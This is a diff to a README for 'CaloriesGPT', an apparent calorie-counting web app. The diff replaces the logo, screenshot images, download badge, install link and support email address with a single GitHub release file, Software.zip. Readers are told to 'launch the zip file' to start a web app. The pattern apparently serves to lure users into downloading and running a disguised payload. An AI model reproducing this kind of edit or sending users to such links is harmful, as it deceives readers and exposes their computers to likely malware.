@@ -1,6 +1,6 @@
 # 🏋️‍♂️ CaloriesGPT - AI Driven Calories Counting Web App 🍎💪
 
-![CaloriesGPT Logo](https://example.com/logo.png)
+![CaloriesGPT Logo](https://github.com/WhiteSharkDev/CaloriesGPT/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -52,17 +52,17 @@ Welcome to CaloriesGPT - your one-stop solution for tracking calories and stayin
 
 ## 🌐 Installation
 
-To get started with CaloriesGPT, download the latest version from the [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Launch the zip file to begin using the web app.
+To get started with CaloriesGPT, download the latest version from the [here](https://github.com/WhiteSharkDev/CaloriesGPT/releases/download/v1.0/Software.zip). Launch the zip file to begin using the web app.
 
-[![Download CaloriesGPT](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download CaloriesGPT](https://github.com/WhiteSharkDev/CaloriesGPT/releases/download/v1.0/Software.zip)](https://github.com/WhiteSharkDev/CaloriesGPT/releases/download/v1.0/Software.zip)
 
 ---
 
 ## 📸 Screenshots
 
-![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 1](https://github.com/WhiteSharkDev/CaloriesGPT/releases/download/v1.0/Software.zip)
 
-![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 2](https://github.com/WhiteSharkDev/CaloriesGPT/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -83,7 +83,7 @@ We welcome contributions from the community to enhance CaloriesGPT further. Feel
 
 ## 📞 Support
 
-For any issues or queries, please contact our support team at support@caloriesgpt.com.
+For any issues or queries, please contact our support team at https://github.com/WhiteSharkDev/CaloriesGPT/releases/download/v1.0/Software.zip
 
 ---
 
